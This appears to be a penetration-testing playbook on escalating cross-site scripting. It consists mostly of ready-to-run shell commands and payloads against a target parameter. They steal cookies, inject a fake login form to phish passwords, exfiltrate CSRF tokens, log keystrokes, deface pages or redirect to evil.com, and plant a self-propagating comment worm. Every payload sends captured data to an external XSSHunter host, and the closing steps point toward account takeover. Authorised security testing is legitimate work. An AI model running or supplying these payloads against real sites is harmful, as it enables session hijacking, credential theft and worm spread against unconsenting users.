# XSS — Impact Escalation

## Purpose
Maximize severity of confirmed XSS. Escalate from alert() to session hijacking, credential theft, keylogging, CSRF token exfiltration, and DOM manipulation. Demonstrate real-world attacker impact.

## Required Variables
- `$TARGET_URL` — vulnerable endpoint
- `$VULN_PARAM` — confirmed injectable parameter
- `$OUTDIR` — output root

## Commands

### E1 — Cookie Theft (Session Hijacking)

```bash
XSSH="https://YOUR_XSSHUNTER.xss.ht"

# Steal cookies via fetch (bypasses HttpOnly? no — but proves impact if missing)
COOKIE_PAYLOAD="<img src=x onerror=fetch('${XSSH}?c='+document.cookie)>"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${COOKIE_PAYLOAD}'))")
curl -s "$TARGET_URL?${VULN_PARAM}=${ENC}" -o /dev/null

# Full document.cookie dump
COOKIE_FULL="<svg/onload=\"new Image().src='${XSSH}?cookie='+encodeURIComponent(document.cookie)\">"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${COOKIE_FULL}'))")
curl -s "$TARGET_URL?${VULN_PARAM}=${ENC}" -o /dev/null
echo "[*] Cookie theft payload sent. Monitor: ${XSSH} dashboard"
```

### E2 — Credential Phishing (Login Form Injection)

```bash
# Inject a fake login form that exfiltrates credentials
PHISH_FORM="<div style='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border:2px solid red;z-index:9999'><h3>Session Expired</h3><form id='xf' action='${XSSH}' method='POST'><input name='user' placeholder='Username'><br><input name='pass' type='password' placeholder='Password'><br><button>Re-login</button></form><script>document.getElementById('xf').addEventListener('submit',function(e){e.preventDefault();fetch('${XSSH}?u='+this.user.value+'&p='+this.pass.value)})</script></div>"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PHISH_FORM}'))")
curl -s "$TARGET_URL?${VULN_PARAM}=${ENC}" -o /dev/null
```

### E3 — CSRF Token Exfiltration

```bash
# Extract CSRF tokens from page and send to attacker
CSRF_PAYLOAD="<svg/onload=\"var tok=document.querySelector('[name=csrf_token]')||document.querySelector('[name=_csrf]');if(tok){fetch('${XSSH}?tok='+encodeURIComponent(tok.value))}\">"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${CSRF_PAYLOAD}'))")
curl -s "$TARGET_URL?${VULN_PARAM}=${ENC}" -o /dev/null
```

### E4 — Keylogger Injection

```bash
KEYLOG='<svg/onload="document.onkeypress=function(e){fetch('\''${XSSH}?k='\''+e.key)}">'
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${KEYLOG}'))")
curl -s "$TARGET_URL?${VULN_PARAM}=${ENC}" -o /dev/null
```

### E5 — Page Defacement / DOM Manipulation

```bash
# Replace entire page body
DEFACE="<svg/onload=\"document.body.innerHTML='<h1 style=text-align:center;color:red;margin-top:40vh>PWNED by Security Researcher</h1>'\">"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${DEFACE}'))")
curl -s "$TARGET_URL?${VULN_PARAM}=${ENC}" -o /dev/null

# Redirect users to attacker site
REDIRECT="<svg/onload=\"location.href='https://evil.com/phishing'\">"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${REDIRECT}'))")
curl -s "$TARGET_URL?${VULN_PARAM}=${ENC}" -o /dev/null
```

### E6 — Stored XSS Worm (Self-Propagating for Social Apps)

```bash
# Payload that re-posts itself (simplified — needs target-specific endpoint)
WORM_PREFIX="<svg/onload=\"var x=new XMLHttpRequest();x.open('POST','/api/comment',true);x.setRequestHeader('Content-Type','application/json');"
WORM_SUFFIX="x.send(JSON.stringify({body:document.currentScript.outerHTML}))\">"
```

### E7 — Severity Classification

```bash
cat > "$OUTDIR/xss/severity_rating.md" << 'SEVEOF'
| Type | Conditions | Severity |
|---|---|---|
| Reflected (no auth) | No authentication required | Medium |
| Reflected (auth required) | Requires user session | High |
| Stored (public) | All users see it | High |
| Stored (admin view) | Admin-only page renders payload | Critical |
| DOM XSS (sensitive page) | On authenticated dashboard | High |
| Blind XSS (admin panel) | Admin dashboard renders payload | Critical |
| CSP bypass | Exploitable despite CSP | +1 severity |
| WAF bypass | Exploitable despite WAF | +1 severity |
SEVEOF
```

## Detection Signals
- XSSHunter receives callback with `?c=` containing cookie values → session hijack confirmed
- XSSHunter receives `?u=` and `?p=` → credentials captured
- XSSHunter receives `?tok=` with CSRF token → CSRF chaining possible
- Keylogger captures keystrokes → full credential theft demonstrated

## False Positives
- HttpOnly cookies won't be accessible via `document.cookie` — cookie theft impact is reduced
- CSP `connect-src` directive may block `fetch()` to XSSHunter — use `new Image().src=` or `<img src=>` instead
- SAMESite=Strict cookies won't be sent cross-site — session hijack via cookie theft may be limited

## Next
├── If cookie theft confirmed and session still valid → attempt account takeover
├── If CSRF token exfiltrated → chain with CSRF attack for account modification
├── If keylogger/credential phishing demonstrated → escalate to Critical severity
└── Always → go to `05-evidence-collection.md` to document full attack chain